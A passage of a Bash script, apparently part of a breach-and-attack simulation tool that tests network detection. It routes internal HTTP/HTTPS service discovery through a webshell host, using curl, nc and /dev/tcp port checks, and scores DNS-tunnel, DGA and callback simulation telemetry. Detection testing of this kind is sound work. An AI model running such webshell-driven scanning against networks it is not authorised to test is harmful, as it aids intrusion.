    echo "HTTP_CANDIDATE_PROBE host=\${h} port=\${p} scheme=\${scheme} status=000 server=- reason=no_curl"
    return 1
fi
head=\$(curl \${tls} -s -I --max-time 5 "\${url}" 2>/dev/null | tr -d '\\r')
body=\$(curl \${tls} -s --max-time 5 "\${url}" 2>/dev/null | head -c 4096)
status=\$(printf '%s\\n' "\${head}" | awk 'toupper(\$1) ~ /^HTTP\\// {c=\$2} END{ if (c=="") print "000"; else print c }')
if [[ ! "\${status}" =~ ^[0-9]+\$ || "\${status}" == "000" ]]; then
    status=\$(curl \${tls} -s -o /dev/null -w '%{http_code}' --max-time 5 "\${url}" 2>/dev/null || echo 000)
fi
server=\$(printf '%s\\n' "\${head}" | awk -F': ' 'toupper(\$1)=="SERVER"{sub(/^Server: /,""); print; exit}')
if [[ "\${status}" =~ ^[0-9]+\$ && "\${status}" != "000" ]]; then
    reason="\${scheme}_status"
fi
if [[ "\${status}" == "301" || "\${status}" == "302" ]]; then
    reason="redirect"
elif [[ -n "\${server}" && -z "\${reason}" ]]; then
    reason="server_header"
elif [[ -z "\${reason}" ]] && printf '%s' "\${body}" | grep -qiE '<html|<!doctype|<head'; then
    reason="html_body"
elif [[ -z "\${reason}" ]] && printf '%s' "\${body}" | grep -qE '^[[:space:]]*[\\[{]'; then
    reason="json_body"
fi
echo "HTTP_CANDIDATE_PROBE host=\${h} port=\${p} scheme=\${scheme} status=\${status} server=\${server:--} reason=\${reason:-none}"
[[ -n "\${reason}" && "\${reason}" != "none" ]]
}
primary='$(http_discovery_port_default_scheme "${port}")'
alternate='http'
[[ "\${primary}" == "http" ]] && alternate='https'
if probe_http_candidate_scheme "\${primary}"; then exit 0; fi
probe_http_candidate_scheme "\${alternate}" || true
EOF
}

parse_http_candidate_probe_line() {
    local line="$1" host="" port="" scheme="" status="" server="" reason=""
    [[ "${line}" == HTTP_CANDIDATE_PROBE* ]] || return 1
    host=$(sed -n 's/.*host=\([^ ]*\).*/\1/p' <<< "${line}")
    port=$(sed -n 's/.*port=\([^ ]*\).*/\1/p' <<< "${line}")
    scheme=$(sed -n 's/.*scheme=\([^ ]*\).*/\1/p' <<< "${line}")
    status=$(sed -n 's/.*status=\([^ ]*\).*/\1/p' <<< "${line}")
    server=$(sed -n 's/.*server=\([^ ]*\).*/\1/p' <<< "${line}")
    reason=$(sed -n 's/.*reason=\([^ ]*\).*/\1/p' <<< "${line}")
    [[ -n "${host}" && -n "${port}" && -n "${scheme}" ]] || return 1
    [[ -n "${reason}" && "${reason}" != "none" && "${reason}" != "no_curl" ]] || return 1
    printf '%s %s %s %s %s %s\n' "${host}" "${port}" "${scheme}" "${status}" "${server}" "${reason}"
}

register_http_candidate_target() {
    local host="$1" port="$2" scheme="$3" entry dst_file
    entry="${host}:${port}"
    case "${scheme}" in
        https) dst_file="https_targets.txt" ;;
        *) dst_file="http_targets.txt" ;;
    esac
    discovery_local_cache_append "${entry}" "${dst_file}"
    run_webshell_quick "http-candidate-append-${host}-${port}" \
        "mkdir -p '${REMOTE_RUNTIME_DIR}' && grep -qxF '${entry}' '${REMOTE_RUNTIME_DIR}/${dst_file}' 2>/dev/null || echo '${entry}' >> '${REMOTE_RUNTIME_DIR}/${dst_file}'" \
        >/dev/null 2>&1 || true
}

log_http_candidate_discovered() {
    local host="$1" port="$2" scheme="$3" status="$4" server="$5" reason="$6"
    local msg="HTTP_CANDIDATE_DISCOVERED host=${host} port=${port} scheme=${scheme} status=${status} server=${server:-} reason=${reason}"
    log_message "OK" "${msg}"
    state_append "http_candidate_discovery.log" "${msg}"
}

log_http_candidate_summary() {
    local count="$1" ports="$2" targets="$3"
    local msg="HTTP_CANDIDATE_SUMMARY count=${count} ports=${ports} targets=${targets}"
    log_message "OK" "${msg}"
    state_append "http_candidate_discovery.log" "${msg}"
}

probe_http_candidate_on_host_port() {
    local host="$1" port="$2" out line parsed h p scheme status server reason
    if [[ "${DRY_RUN}" == true ]]; then
        return 1
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        return 1
    fi
    out=$(run_webshell_quick "http-candidate-${host}-${port}" \
        "$(build_http_candidate_probe_remote_cmd "${host}" "${port}")" \
        2>/dev/null | tr -d '\r' || true)
    line=$(printf '%s\n' "${out}" | grep 'HTTP_CANDIDATE_PROBE' | tail -n 1 || true)
    parsed=$(parse_http_candidate_probe_line "${line}" 2>/dev/null) || return 1
    read -r h p scheme status server reason <<< "${parsed}"
    register_http_candidate_target "${h}" "${p}" "${scheme}"
    log_http_candidate_discovered "${h}" "${p}" "${scheme}" "${status}" "${server}" "${reason}"
    return 0
}

stage_discover_http_candidates() {
    if fast_safe_mode_enabled 2>/dev/null; then
        add_executed_stage "HTTP Candidate Discovery"
        set_stage_result "HTTP Candidate Discovery" "Skipped" "fast-safe: service-discovery reachable targets only"
        log_message "OK" "FAST_SAFE_SKIP_STAGE name=HTTP Candidate Discovery reason=fast_safe_dedicated_pipeline"
        return 0
    fi
    local host port count=0 ports_seen="" targets_seen="" host_n
    declare -A seen_target=()
    add_executed_stage "HTTP Candidate Discovery"
    write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "start" "expanded web port HTTP/HTTPS validation"
    HTTP_CANDIDATE_DISCOVERY_COUNT=0
    : > "${LOCAL_STATE_DIR}/http_candidate_discovery.log" 2>/dev/null || true

    ports_seen=$(http_discovery_ports_csv)
    host_n=$(safe_int "$(collect_http_discovery_hosts | safe_count_lines)")

    if [[ "${DRY_RUN}" == true ]]; then
        local scheme src_file
        for scheme in http https; do
            src_file="${scheme}_targets.txt"
            while IFS= read -r line; do
                [[ -z "${line}" ]] && continue
                read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}" 2>/dev/null)" || continue
                [[ -n "${seen_target[${host}:${port}]:-}" ]] && continue
                seen_target[${host}:${port}]=1
                register_http_candidate_target "${host}" "${port}" "${scheme}"
                log_http_candidate_discovered "${host}" "${port}" "${scheme}" "200" "dry-run" "dry_run"
                count=$((count + 1))
                targets_seen+="${host}:${port} "
            done < <(get_local_hosts "${src_file}" 2>/dev/null || true)
        done
        HTTP_CANDIDATE_DISCOVERY_COUNT="${count}"
        log_http_candidate_summary "${count}" "${ports_seen}" "${targets_seen%% }"
        set_stage_result "HTTP Candidate Discovery" "Success" "candidates=${count} hosts=${host_n} (dry-run)"
        write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "success" "candidates=${count}"
        return 0
    fi

    if [[ "${HAS_curl:-false}" != true ]]; then
        log_message "WARN" "HTTP candidate discovery skipped: curl unavailable on webshell host"
        add_fallback_usage "HTTP candidate discovery: curl missing on webshell"
        log_http_candidate_summary "0" "${ports_seen}" "none"
        set_stage_result "HTTP Candidate Discovery" "Skipped" "curl unavailable on webshell"
        write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "skipped" "curl unavailable"
        return 0
    fi

    if (( host_n == 0 )); then
        log_message "WARN" "HTTP candidate discovery: no discovered hosts to probe"
        log_http_candidate_summary "0" "${ports_seen}" "none"
        set_stage_result "HTTP Candidate Discovery" "Skipped" "no discovered hosts"
        write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "skipped" "no hosts"
        return 0
    fi

    log_message "OK" "HTTP candidate discovery: hosts=${host_n} ports=${ports_seen}"

    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        pipeline_stop_requested && break
        ip_in_target_net "${host}" || continue
        for port in $(http_discovery_all_ports); do
            pipeline_stop_requested && break
            if probe_http_candidate_on_host_port "${host}" "${port}"; then
                count=$((count + 1))
                seen_target[${host}:${port}]=1
                targets_seen+="${host}:${port} "
            fi
        done
    done < <(collect_http_discovery_hosts)

    dedupe_discovery_local_cache
    discovery_push_local_cache_to_remote >/dev/null 2>&1 || true
    HTTP_CANDIDATE_DISCOVERY_COUNT="${count}"
    log_http_candidate_summary "${count}" "${ports_seen}" "${targets_seen%% }"
    set_stage_result "HTTP Candidate Discovery" "Success" "candidates=${count} hosts=${host_n}"
    write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "success" "candidates=${count}"
}

remote_validate_http_usable() {
    local host="$1" _scheme="${2:-http}" port="${3:-80}"
    run_webshell_quick "usable-http-${host}-${port}" \
        "nc -z -w2 ${host} ${port} && echo HTTP_USABLE || bash -c \"echo >/dev/tcp/${host}/${port}\" && echo HTTP_USABLE || echo HTTP_DEAD" 2>/dev/null | tr -d '\r' | tail -n 1
}

web_target_ip_only() {
    local line="$1" norm host="" port="" scheme=""
    norm=$(normalize_web_target_line "${line}" "http" 2>/dev/null) || {
        printf '%s' "${line%%:*}"
        return 0
    }
    read -r host port scheme <<< "${norm}"
    printf '%s' "${host}"
}

web_target_files_for_scheme() {
    local scheme="$1"
    case "${scheme}" in
        http) printf '%s\n' "http_targets.txt" "usable_http_targets.txt" "reachable_http_targets.txt" ;;
        https) printf '%s\n' "https_targets.txt" "usable_https_targets.txt" "reachable_https_targets.txt" ;;
    esac
}

normalize_web_target_line() {
    local raw="$1" default_scheme="${2:-http}" line scheme host port
    raw="${raw//$'\r'/}"
    raw="${raw#"${raw%%[![:space:]]*}"}"
    raw="${raw%"${raw##*[![:space:]]}"}"
    [[ -z "${raw}" ]] && return 1

    line="${raw}"
    scheme="${default_scheme}"
    if [[ "${line}" == http://* ]]; then
        scheme="http"
        line="${line#http://}"
    elif [[ "${line}" == https://* ]]; then
        scheme="https"
        line="${line#https://}"
    fi
    line="${line%%/*}"
    line="${line%%\?*}"

    if [[ "${line}" =~ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+).*[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ ]]; then
        return 1
    fi

    host="${line%%:*}"
    if [[ "${host}" == "${line}" ]]; then
        port=""
    else
        port="${line#*:}"
        if [[ "${port}" == *:* ]]; then
            return 1
        fi
    fi

    [[ "${host}" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || return 1
    [[ -n "${host}" ]] || return 1

    if [[ -z "${port}" ]]; then
        case "${scheme}" in
            https) port="443" ;;
            *) port="80" ;;
        esac
    fi
    [[ "${port}" =~ ^[0-9]+$ ]] || return 1
    (( port >= 1 && port <= 65535 )) || return 1

    printf '%s %s %s\n' "${host}" "${port}" "${scheme}"
}

format_web_hostport() {
    local host="$1" port="$2"
    if [[ "${host}" == *:* ]]; then
        printf '%s' "${host%%:*}:${port}"
    else
        printf '%s:%s' "${host}" "${port}"
    fi
}

build_web_target_url() {
    local scheme="$1" host="$2" port="$3" path="${4:-/}"
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    [[ "${path}" != /* ]] && path="/${path}"
    printf '%s://%s:%s%s' "${scheme}" "${host}" "${port}" "${path}"
}

web_target_parse_line() {
    local line="$1" scheme="$2" norm host port out_scheme
    norm=$(normalize_web_target_line "${line}" "${scheme}" 2>/dev/null) || return 1
    read -r host port out_scheme <<< "${norm}"
    [[ "${out_scheme}" == "${scheme}" ]] || return 1
    printf '%s %s %s\n' "${host}" "${port}" "${out_scheme}"
}

count_host_file_lines() {
    local file="$1"
    safe_int "$(get_local_hosts "${file}" 2>/dev/null | extract_host_file_lines | safe_count_lines)"
}

collect_web_target_candidates() {
    local scheme="$1" src_file line norm host port out_scheme key
    declare -A seen=()
    WEB_REACH_MALFORMED_DROPPED=0
    while IFS= read -r src_file; do
        [[ -z "${src_file}" ]] && continue
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            norm=$(normalize_web_target_line "${line}" "${scheme}" 2>/dev/null) || {
                WEB_REACH_MALFORMED_DROPPED=$((WEB_REACH_MALFORMED_DROPPED + 1))
                continue
            }
            read -r host port out_scheme <<< "${norm}"
            [[ "${out_scheme}" == "${scheme}" ]] || continue
            key="${host}:${port}"
            [[ -n "${seen[$key]:-}" ]] && continue
            seen[$key]=1
            printf '%s:%s\n' "${host}" "${port}"
        done < <(get_local_hosts "${src_file}" 2>/dev/null | extract_host_file_lines)
    done < <(web_target_files_for_scheme "${scheme}")
}

count_web_targets_in_file() {
    local file="$1" scheme n=0 raw_n usable_n
    [[ -z "${file}" ]] && { echo 0; return 0; }
    case "${file}" in
        http_targets.txt)
            scheme="http"
            raw_n=$(count_host_file_lines "http_targets.txt")
            usable_n=$(count_host_file_lines "usable_http_targets.txt")
            n=$(safe_int "$(collect_web_target_candidates "http" | safe_count_lines)")
            if (( raw_n > 0 && n == 0 )); then
                log_message "WARN" "http_targets.txt has ${raw_n} entries but merged web candidates=0 — using raw+usable fallback"
                add_fallback_usage "Web targets: http raw=${raw_n} usable=${usable_n} merged=0 — candidate merge fallback"
                n=$((raw_n + usable_n))
            elif (( n == 0 && usable_n > 0 )); then
                n="${usable_n}"
            fi
            ;;
        https_targets.txt)
            scheme="https"
            raw_n=$(count_host_file_lines "https_targets.txt")
            usable_n=$(count_host_file_lines "usable_https_targets.txt")
            n=$(safe_int "$(collect_web_target_candidates "https" | safe_count_lines)")
            if (( raw_n > 0 && n == 0 )); then
                log_message "WARN" "https_targets.txt has ${raw_n} entries but merged web candidates=0 — using raw+usable fallback"
                add_fallback_usage "Web targets: https raw=${raw_n} usable=${usable_n} merged=0 — candidate merge fallback"
                n=$((raw_n + usable_n))
            elif (( n == 0 && usable_n > 0 )); then
                n="${usable_n}"
            fi
            ;;
        *)
            n=$(count_host_file_lines "${file}")
            if (( n == 0 )); then
                n=$(safe_int "$(count_remote_target_file "${file}")")
            fi
            ;;
    esac
    safe_int "${n}"
}

count_reachable_web_targets() {
    local scheme="$1" file count=0
    case "${scheme}" in
        http) file="reachable_http_targets.txt" ;;
        https) file="reachable_https_targets.txt" ;;
        *) echo 0; return 0 ;;
    esac
    count=$(safe_int "$(collect_hosts_from_remote_file "${file}" | safe_count_lines)")
    echo "${count}"
}

sync_url_scan_selected_target_count() {
    local scan_targets="$1"
    HTTP_SCAN_TARGET_COUNT=$(safe_int "$(printf '%s\n' "${scan_targets}" | awk 'NF {c++} END {print c+0}')")
}

format_intensity_runtime_values_block() {
    cat <<EOF
Intensity Runtime Values
- intensity                   : ${POC_INTENSITY}
- HTTP_FOLLOWUP_REQUESTS      : ${HTTP_FOLLOWUP_REQUESTS}
- SSH_BURST_ATTEMPTS          : ${SSH_BURST_ATTEMPTS}
- DNS_TUNNEL_QUERY_COUNT      : ${DNS_TUNNEL_QUERY_COUNT}
- INTERNAL_FANOUT_PER_TARGET  : ${INTERNAL_FANOUT_PER_TARGET}
- STRICT_FOLLOWUP_VALIDATION  : ${STRICT_FOLLOWUP_VALIDATION}
EOF
}

normalize_telemetry_module_status() {
    case "${1:-skipped}" in
        success|fallback_success|partial|failed|skipped) printf '%s' "$1" ;;
        warn|degraded|partial) printf 'partial' ;;
        fail|failed) printf 'failed' ;;
        skip|skipped) printf 'skipped' ;;
        *) printf 'failed' ;;
    esac
}

telemetry_set_module_counts() {
    local -n _out="$1"
    local planned="$2" attempted="$3" executed="$4" successful="$5"
    local generated="${6:-${attempted}}" parsed="${7:-${executed}}" validated="${8:-${successful}}"
    _out="generated=${generated} attempted=${attempted} sent=${executed} response=${parsed} parsed=${parsed} validated=${validated} planned=${planned} executed=${executed} successful=${successful}"
}

evaluate_telemetry_dns_tunnel() {
    local planned executed successful summary="" sent=0 unique=0
    local attempted=$((DNS_TUNNEL_ENH_ATTEMPTED + DNS_TUNNEL_FB_ATTEMPTED))
    (( attempted == 0 )) && attempted=$(safe_int "${DNS_QUERIES_ATTEMPTED}")
    planned=$(safe_int "${DNS_QUERIES_PLANNED:-${DNS_TUNNEL_QUERY_COUNT:-0}}")
    event_store_paths_refresh
    if [[ "${DNS_TUNNEL_STAGE_STATUS}" == skipped || "${DNS_TUNNEL_ENH_RESULT}" == skipped ]] && [[ ! -s "${EVENT_DNS_EVENTS:-}" ]]; then
        TELEMETRY_VAL_DNS_TUNNEL="skipped"
        TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_SKIP_REASON:-${DNS_TUNNEL_ENH_REASON:-no_queries}}"
        telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" 0 0
        return 0
    fi
    if [[ "${DNS_TUNNEL_SKIP_REASON}" == "dns_server_validation_failed" && -z "${DNS_SELECTED_DNS:-${DNS_TARGET_SERVER}}" ]]; then
        TELEMETRY_VAL_DNS_TUNNEL="environment_failure"
        TELEMETRY_VAL_DNS_REASON="dns_server_validation_failed"
        telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" 0 0
        return 0
    fi
    if net_sim_dns_tunnel_classify_env_failure "${DNS_TUNNEL_SKIP_REASON:-}" 2>/dev/null; then
        TELEMETRY_VAL_DNS_TUNNEL="environment_failure"
        TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_SKIP_REASON:-resolver_unreachable}"
        telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" 0 0
        return 0
    fi
    event_apply_module_validation "DNS_TUNNEL" "dns_tunnel_file_client"
    summary="${EVENT_MODULE_SUMMARY[DNS_TUNNEL]:-}"
    sent=$(safe_int "$(event_summary_field "${summary}" sent 0)")
    unique=$(safe_int "$(event_summary_field "${summary}" unique_fqdn 0)")
    executed="${sent}"
    successful=$(safe_int "$(event_summary_field "${summary}" response 0)")
    (( attempted < sent )) && attempted="${sent}"
    telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
    DNS_TUNNEL_STAGE_STATUS="${TELEMETRY_VAL_DNS_TUNNEL}"
}

evaluate_telemetry_http_url_scan() {
    local planned=$(safe_int "${HTTP_REQUESTS_PLANNED:-0}")
    local summary="" attempted=0 executed=0 successful=0
    event_store_paths_refresh
    if (( HTTP_SCAN_TARGET_COUNT == 0 )) && [[ ! -s "${EVENT_HTTP_EVENTS:-}" ]]; then
        TELEMETRY_VAL_HTTP_URL_SCAN="skipped"
        TELEMETRY_VAL_HTTP_REASON="no_reachable_http_targets"
        telemetry_set_module_counts TELEM_HTTP_COUNTS "${planned}" 0 0 0
        return 0
    fi
    event_apply_module_validation "HTTP_URL_SCAN" "main"
    summary="${EVENT_MODULE_SUMMARY[HTTP_URL_SCAN]:-}"
    attempted=$(safe_int "$(event_summary_field "${summary}" attempted 0)")
    executed="${attempted}"
    successful=$(safe_int "$(event_summary_field "${summary}" completed 0)")
    if (( attempted == 0 )) && [[ ! -s "${EVENT_HTTP_EVENTS:-}" ]]; then
        TELEMETRY_VAL_HTTP_URL_SCAN="failed"
        TELEMETRY_VAL_HTTP_REASON="evidence_missing total_requests=0"
    fi
    telemetry_emit_module_validation "HTTP" "${TELEMETRY_VAL_HTTP_URL_SCAN}" "${TELEMETRY_VAL_HTTP_REASON}"
    telemetry_set_module_counts TELEM_HTTP_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
    HTTP_URL_SCAN_STAGE_STATUS="${TELEMETRY_VAL_HTTP_URL_SCAN}"
}


evaluate_telemetry_external_callback() {
    local planned=$(safe_int "${EXTERNAL_CALLBACK_PLANNED:-${EXTERNAL_CALLBACK_ATTEMPTED:-0}}")
    local attempted=$(safe_int "${EXTERNAL_CALLBACK_ATTEMPTED:-0}")
    local executed="${attempted}"
    local successful=$(safe_int "${EXTERNAL_CALLBACK_CONNECTED:-0}")
    external_callback_resolve_final_status
    TELEMETRY_VAL_EXTERNAL_CALLBACK=$(normalize_telemetry_module_status "$(external_callback_stage_status)")
    case "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" in
        success) TELEMETRY_VAL_CALLBACK_REASON="connected=${EXTERNAL_CALLBACK_CONNECTED:-0} attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0}" ;;
        fallback_success) TELEMETRY_VAL_CALLBACK_REASON="callback_connected=0 internal_web_fanout_success=${INTERNAL_FANOUT_RESPONSES:-${INTERNAL_FANOUT_CONNECTED:-0}}" ;;
        failed) TELEMETRY_VAL_CALLBACK_REASON="connected=0 attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0} internal_web_fanout_success=0" ;;
        *) TELEMETRY_VAL_CALLBACK_REASON="not_attempted" ;;
    esac
    telemetry_set_module_counts TELEM_CALLBACK_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

evaluate_telemetry_nonstandard_port() {
    local host_count
    local planned attempted executed successful
    host_count=$(safe_int "$(count_hosts_blob "$(collect_nonstandard_port_hosts 2>/dev/null || true)")")
    planned=$(safe_int "${NONSTANDARD_PORT_CONNECTIONS:-0}")
    attempted="${planned}"
    executed="${planned}"
    successful=0
    if (( host_count == 0 )); then
        TELEMETRY_VAL_NONSTANDARD_PORT="skipped"
        TELEMETRY_VAL_NONSTANDARD_REASON="no_nonstandard_port_targets"
        telemetry_set_module_counts TELEM_NONSTANDARD_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( NONSTANDARD_PORT_CONNECTIONS > 0 )); then
        TELEMETRY_VAL_NONSTANDARD_PORT="success"
        TELEMETRY_VAL_NONSTANDARD_REASON="connections=${NONSTANDARD_PORT_CONNECTIONS}"
        successful="${NONSTANDARD_PORT_CONNECTIONS}"
    else
        TELEMETRY_VAL_NONSTANDARD_PORT="failed"
        TELEMETRY_VAL_NONSTANDARD_REASON="connections=0 targets=${host_count}"
    fi
    telemetry_set_module_counts TELEM_NONSTANDARD_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

evaluate_telemetry_dga_simulation() {
    local planned attempted executed successful summary=""
    planned=$(safe_int "${DGA_QUERIES_PLANNED:-${DGA_NXDOMAIN_QUERIES:-250}}")
    (( planned < 1 )) && planned=250
    attempted="${planned}"
    if [[ "${DGA_SIMULATION_ENABLED}" != true ]]; then
        TELEMETRY_VAL_DGA_SIMULATION="skipped"
        TELEMETRY_VAL_DGA_REASON="disabled"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" 0 0
        return 0
    fi
    if [[ "${DGA_STAGE_STATUS}" == skipped || "${DGA_STAGE_STATUS}" == Skipped ]]; then
        TELEMETRY_VAL_DGA_SIMULATION="skipped"
        TELEMETRY_VAL_DGA_REASON="${DGA_SKIP_REASON:-stage_skipped}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" 0 0
        return 0
    fi
    event_store_paths_refresh
    if net_sim_dns_tunnel_classify_env_failure "${DGA_SKIP_REASON:-}" 2>/dev/null; then
        TELEMETRY_VAL_DGA_SIMULATION="environment_failure"
        TELEMETRY_VAL_DGA_REASON="${DGA_SKIP_REASON:-resolver_unreachable}"
        telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" 0 0
        return 0
    fi
    event_apply_module_validation "DGA_SIMULATION" "dga_model_client"
    summary="${EVENT_MODULE_SUMMARY[DGA_SIMULATION]:-}"
    executed=$(safe_int "$(event_summary_field "${summary}" sent 0)")
    successful=$(safe_int "$(event_summary_field "${summary}" nxdomain 0)")
    successful=$((successful + $(safe_int "$(event_summary_field "${summary}" resolvable 0)")))
    event_sync_legacy_counters_from_sot || true
    DGA_STAGE_STATUS="${TELEMETRY_VAL_DGA_SIMULATION}"
    telemetry_set_module_counts TELEM_DGA_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
}

compute_overall_telemetry_validation() {
    local has_failed=false has_partial=false skipped_core=""
    local r core_success=0

    for r in "${TELEMETRY_VAL_DNS_TUNNEL}" "${TELEMETRY_VAL_DGA_SIMULATION}" "${TELEMETRY_VAL_HTTP_URL_SCAN}" \
            "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" "${TELEMETRY_VAL_NONSTANDARD_PORT}"; do
        [[ "${r}" == failed ]] && has_failed=true
        [[ "${r}" == partial ]] && has_partial=true
    done
    [[ "${TELEMETRY_VAL_DNS_TUNNEL}" == skipped ]] && skipped_core="${skipped_core} dns_tunnel"
    [[ "${TELEMETRY_VAL_DGA_SIMULATION}" == skipped ]] && skipped_core="${skipped_core} dga_simulation"
    [[ "${TELEMETRY_VAL_HTTP_URL_SCAN}" == skipped ]] && skipped_core="${skipped_core} http_url_scan"
    [[ "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" == skipped ]] && skipped_core="${skipped_core} external_callback"
    [[ "${TELEMETRY_VAL_NONSTANDARD_PORT}" == skipped ]] && skipped_core="${skipped_core} nonstandard_port"

    for r in "${TELEMETRY_VAL_HTTP_URL_SCAN}" "${TELEMETRY_VAL_DNS_TUNNEL}" "${TELEMETRY_VAL_DGA_SIMULATION}"; do
        [[ "${r}" == success ]] && core_success=$((core_success + 1))
    done

    if [[ "${has_failed}" == true ]]; then
        TELEMETRY_VAL_OVERALL="failed"
    elif (( core_success >= 2 )); then
        if [[ "${has_partial}" == true || -n "${skipped_core// /}" ]]; then
            TELEMETRY_VAL_OVERALL="partial"
        else
            TELEMETRY_VAL_OVERALL="success"
        fi
    elif [[ "${has_partial}" == true ]]; then
        TELEMETRY_VAL_OVERALL="partial"
    elif [[ -n "${skipped_core// /}" ]]; then
        TELEMETRY_VAL_OVERALL="partial"
    else
        TELEMETRY_VAL_OVERALL="failed"
    fi

    if [[ "${TELEMETRY_VAL_DNS_TUNNEL}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }dns_tunnel=${TELEMETRY_VAL_DNS_TUNNEL}(${TELEMETRY_VAL_DNS_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_DGA_SIMULATION}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }dga_simulation=${TELEMETRY_VAL_DGA_SIMULATION}(${TELEMETRY_VAL_DGA_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_HTTP_URL_SCAN}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }http_url_scan=${TELEMETRY_VAL_HTTP_URL_SCAN}(${TELEMETRY_VAL_HTTP_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }external_callback=${TELEMETRY_VAL_EXTERNAL_CALLBACK}(${TELEMETRY_VAL_CALLBACK_REASON})"
    fi
    if [[ "${TELEMETRY_VAL_NONSTANDARD_PORT}" != success ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }nonstandard_port=${TELEMETRY_VAL_NONSTANDARD_PORT}(${TELEMETRY_VAL_NONSTANDARD_REASON})"
    fi
    if [[ -n "${skipped_core// /}" && "${TELEMETRY_VAL_OVERALL}" != failed ]]; then
        TELEMETRY_VAL_OVERALL_REASON="${TELEMETRY_VAL_OVERALL_REASON:+$TELEMETRY_VAL_OVERALL_REASON; }skipped_modules:${skipped_core# }"
    fi
    if [[ -z "${TELEMETRY_VAL_OVERALL_REASON}" ]]; then
        TELEMETRY_VAL_OVERALL_REASON="all_core_modules_success"
    fi
}

poc_detection_readiness_level() {
    case "${1,,}" in
        success|fallback_success) printf 'HIGH' ;;
        partial) printf 'MEDIUM' ;;
        skipped) printf 'LOW' ;;
        *) printf 'LOW' ;;
    esac
}

poc_emit_detection_readiness_reason() {
    local module="$1" level="$2" reason="$3"
    log_message "OK" "${module}_DETECTION_READINESS level=${level} reason=${reason}" >&2
    state_append "detection_readiness.log" "${module}_DETECTION_READINESS level=${level} reason=${reason}"
}

log_final_telemetry_validation() {
    local http_gen http_done dns_q dga_q cb_ok=""
    local http_r dns_r dga_r=""
    http_gen=$(safe_int "${HTTP_URL_GEN_COUNT:-${HTTP_REQUESTS_PLANNED:-0}}")
    http_done=$(safe_int "${HTTP_URL_COMPLETE_COUNT:-${HTTP_REQUESTS_ATTEMPTED:-0}}")
    dns_q=$(safe_int "${DNS_QUERIES_SENT:-${DNS_TOTAL_QUERIES:-0}}")
    dga_q=$(safe_int "${DGA_QUERIES_SENT:-${DGA_TOTAL_QUERIES:-0}}")
    cb_ok=$([[ "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" == success || "${TELEMETRY_VAL_EXTERNAL_CALLBACK}" == fallback_success ]] && printf yes || printf no)
    http_r=$(poc_detection_readiness_level "${TELEMETRY_VAL_HTTP_URL_SCAN}")
    dns_r=$(poc_detection_readiness_level "${TELEMETRY_VAL_DNS_TUNNEL}")
    dga_r=$(poc_detection_readiness_level "${TELEMETRY_VAL_DGA_SIMULATION}")
